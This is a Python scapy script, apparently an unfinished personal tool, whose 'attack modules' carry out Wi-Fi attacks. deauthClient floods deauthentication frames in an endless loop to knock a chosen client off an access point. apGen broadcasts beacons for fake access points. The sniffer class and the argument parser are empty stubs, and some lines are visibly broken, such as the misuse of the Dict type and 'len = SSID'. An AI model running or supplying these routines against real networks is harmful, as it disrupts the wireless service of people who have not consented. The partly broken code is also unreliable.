#!/usr/bin/env python3

import argparse

from typing import (
	Tuple,
	List,
	Dict,
	Any
)
from random import randint

from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth, Dot11Beacon, Dot11Elt
from scapy.volatile import RandMAC
from scapy.sendrecv import sendp

# This will be the network packet sniffer (we'll do it later...)
class EtherMon:
	def __init__( self ):
		pass

	# Detect new devices.
	# Detect port scan.
	# 

# Attack modules
def deauthClient( iface: str, targetMAC: str, clientMAC: str ):
	"""
	Deauthenticates select clients from a target network(s).

	:param iface
	:param targetMAC
	:param clientMAC
	"""
	
	# Setup a deauth frame (make sure the interface is in monitor mode)
	# airmon-ng start iface (we won't do it, kinda unsafe to do so from Py!)
	_packet = RadioTap() / Dot11(
		type = 0,
		subtype = 12,
		addr1 = clientMAC,
		addr2 = targetMAC,
		addr3 = targetMAC
	) / Dot11Deauth( reason = 7 )

	while True:
		print ( f"[*] Deauthenticating '{clientMAC}' from '{targetMAC}'." )
		
		sendp( _packet, count = 0.1, iface = iface, verbose = 0 )

def apGen( iface: str ):
	"""
	Generates a number of fake, and hidden access points and generates random noise (pretty useless, but fun).

	:param iface
	"""
	
	# Chaotic dict of random SSIDs (numbers freak out wireless traffic)
	SSIDS: Dict = Dict[
		randint( 0, 99 ),
		randint( 0, 99 ),
		randint( 0, 99 ),
	]

	for SSID in SSIDS:
		addr: str = RandMAC() # Source MAC (generate a random MAC)
		
		# Setup an 802.11 frame
		frame = Dot11(
			type = 0,
			subtype = 8,
			addr1 = "ff:ff:ff:ff:ff:ff",
			addr2 = addr,
			addr3 = addr,
		)
		# Setup the Beacon layer
		beacon = Dot11Beacon()
		# Put SSID in the frame
		ESSID = Dot11Elt(
			ID = "SSID",
			info = SSID,
			len = SSID,
		)
		RSN = Dot11Elt(
			ID = "RSNinfo",
			info = ( # Outsourced ofc
				'\x01\x00'
				'\x00\x0f\xac\x02'
				'\x02\x00'
				'\x00\x0f\xac\x04'
				'\x00\x0f\xac\x02'
				'\x01\x00'
				'\x00\x0f\xac\x02'
				'\x00\x00'
			)
		)

		# Stack all layers and add a RadioTap (required in linux)
		final_frame = RadioTap() / frame / beacon / ESSID / RSN

		print ( f"[*] Generating random access points on '{iface}'. Terminate the program to stop this attack!" )

		sendp( final_frame, inter = 0.01, iface = iface, loop = 1, verbose = 0 )

# Argparser here...

if __name__ == "__main__":
	pass
